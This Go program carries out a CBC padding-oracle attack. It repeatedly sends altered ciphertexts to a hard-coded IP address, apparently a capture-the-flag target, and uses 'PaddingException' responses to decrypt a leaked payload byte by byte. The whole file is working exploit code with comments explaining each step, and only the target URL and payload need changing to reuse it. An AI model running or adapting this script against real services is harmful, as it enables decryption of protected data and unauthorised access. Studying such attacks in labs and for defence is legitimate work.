package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

var (
	decReplacer *strings.Replacer
	encReplacer *strings.Replacer
	client      *http.Client
	ctx         context.Context
	result      []byte
)

const (
	blockLen    = 16
	url         = "http://35.227.24.107/4b511534dd/?post=%s"
	errorString = "PaddingException"
	parallel    = 5
)

func init() {
	decReplacer = strings.NewReplacer("~", "=", "!", "/", "-", "+")
	encReplacer = strings.NewReplacer("=", "~", "/", "!", "+", "-")

	client =
		&http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
}

func decode(s string) []byte {
	b64 := decReplacer.Replace(s)
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		log.Fatal(err)
	}
	return data
}

func encode(data []byte) string {
	b64 := base64.StdEncoding.EncodeToString(data)
	return encReplacer.Replace(b64)
}

var payload = "P4aMnxs6OAuplAJYRUtytvJjq!i2Rc6E1-k2raJ7!SjRgHt1cXEZyemUO62WCn88iA8BGyL-uvPbdwPQR6GE8jSEHZHiXXzhC-pLofE2Z2qN0Wj1mHOlx3dwjitDcvc!uHbsvwCcK!qp4FV3T5l8oKMSR7pJCVDAl!hp6t989eH4c5VWoUnEhxnVXyNQG6YNTr-aHPvpWhQV663CP23YSw~~"

func main() {
	var plaintext string

	// start with proper payload, which is typically leaked from server
	cipher := decode(payload)
	if len(cipher)%blockLen != 0 {
		log.Fatal("cipher len % 16 != 0")
	}

	// get total number of blocks in cipher
	blockCount := len(cipher) / blockLen

	// we really only need to send 2 blocks of ciphertext
	// first is one we gonna tamper
	// second, is where padding error will be produced
	// this way, we move backwards towards the beggining of the whole payload
	// the very last first block is IV

	// loop for every discovered block
	for blockOffset := 0; blockOffset < blockCount-1; blockOffset++ {
		// loop for every byte position inside the discovered block
		ciphertext := cipher[blockOffset*blockLen : (blockOffset+2)*blockLen]

		plaintext += string(revealBlock(ciphertext))
	}

	fmt.Println(plaintext)
}

// reveals a single block of plaintext
// requires cipher input of blockLen*2
func revealBlock(ciphertext []byte) []byte {
	block := make([]byte, blockLen)

	// loop through every byte to tamper, go backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		// reveal the byte
		block[pos] = revealByte(ciphertext, pos)

		// adjust padding for the next shot
		for i := pos; i < blockLen; i++ {
			padVal := byte(blockLen - pos)
			ciphertext[i] ^= padVal ^ (padVal + 1)
		}
	}

	return block
}

// reveals a single byte of plaintext
// requires cipher input of blockLen*2 and a position (0-blockLen)
func revealByte(ciphertext []byte, pos int) byte {
	validCipherByte := ciphertext[pos]

	// try every possible byte value
	for i := byte(0); i <= 255; i++ {

		// play with byte at a given position
		ciphertext[pos] = i

		// send the payload and check for padding error
		found, err := testRequest(ctx, ciphertext)
		if err != nil {
			log.Fatal(err)
		}

		if found {
			val := i ^ (blockLen - byte(pos)) ^ validCipherByte
			fmt.Println(string([]byte{val}))
			return val
		}
	}

	log.Fatal("failed to reveal byte")
	return 0

}

func testRequest(ctx context.Context, data []byte) (bool, error) {
	// encode payload for URL transferring
	payload := encode(data)

	// send request with retries
	req, err := http.NewRequestWithContext(context.Background(), "GET", fmt.Sprintf(url, payload), nil)
	if err != nil {
		return false, err
	}

	// send
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	// parse response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	fmt.Print(".")

	// determine padding error
	return !strings.Contains(string(body), errorString), nil
}
